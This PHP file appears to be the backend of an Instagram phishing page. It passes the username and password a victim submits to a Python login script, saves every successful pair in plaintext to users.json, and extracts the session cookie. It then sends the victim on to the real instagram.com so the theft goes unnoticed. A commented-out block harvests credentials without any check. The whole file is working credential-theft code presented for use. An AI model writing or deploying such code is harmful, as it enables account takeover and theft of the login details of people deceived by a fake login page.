<?php

use function PHPSTORM_META\type;

include_once('../setup.php');

if (isset($_SESSION['error'])) {
    unset($_SESSION['error']);
}

if (isset($_POST['submit'])) {
    $res = array();
    $login_tmp = array('username' => $_POST['username'], 'password' => $_POST['password']);
    file_put_contents('login_tmp.json', json_encode($login_tmp));
    exec($python_path . ' login.py', $res);
    $headers = json_decode($res[1], true);
    $res = json_decode($res[0], true);
    if (!isset($res['authenticated']) || (isset($res['authenticated']) && $res['authenticated'] != true)) {
        if (isset($res['errors'])) {
            $_SESSION['error'] = $res['errors']['error'][0];
            header('location: ' . $url);
        } else if (isset($res['authenticated']) && $res['authenticated'] != true) {
            $_SESSION['error'] = "Tu contraseña no es correcta. Vuelve a comprobarla.";
            header('location: ' . $url);
        }
    } else {
        if ($res['authenticated'] == true) {

            if (file_exists('users.json')) {
                $users = file_get_contents('users.json', true);
                $users = json_decode($users, true);
                array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
                file_put_contents('users.json', json_encode($users));
            } else {
                $users = ['users' => []];
                array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
                file_put_contents('users.json', json_encode($users));
            }

            $sessionid = array('sessionid' => substr(explode(';', explode('sessionid', $headers['Set-Cookie'])[1])[0], 1));
            var_dump($sessionid);
            header('Referer: https://www.instagram.com');
            header('hola: adios');
            header('location: https://www.instagram.com');
            setrawcookie('sessionid', $sessionid['sessionid'], time() + 60*60*24*30, '/', 'instagram.com', secure:true, httponly:true);
        } else {
            $_SESSION['error'] = "Ha ocurrido un error al iniciar sesión, vuelva a intentarlo.";
            header('location: ' . $url);
        }
    }
}



// if (isset($_POST['submit'])) {
//     if (file_exists('users.json')) {
//         $users = file_get_contents('users.json', true);
//         $users = json_decode($users, true);
//         array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
//         file_put_contents('users.json', json_encode($users));
//     } else {
//         $users = ['users' => []];
//         array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
//         file_put_contents('users.json', json_encode($users));
//     }
//     header('location: ../index.html');
// }
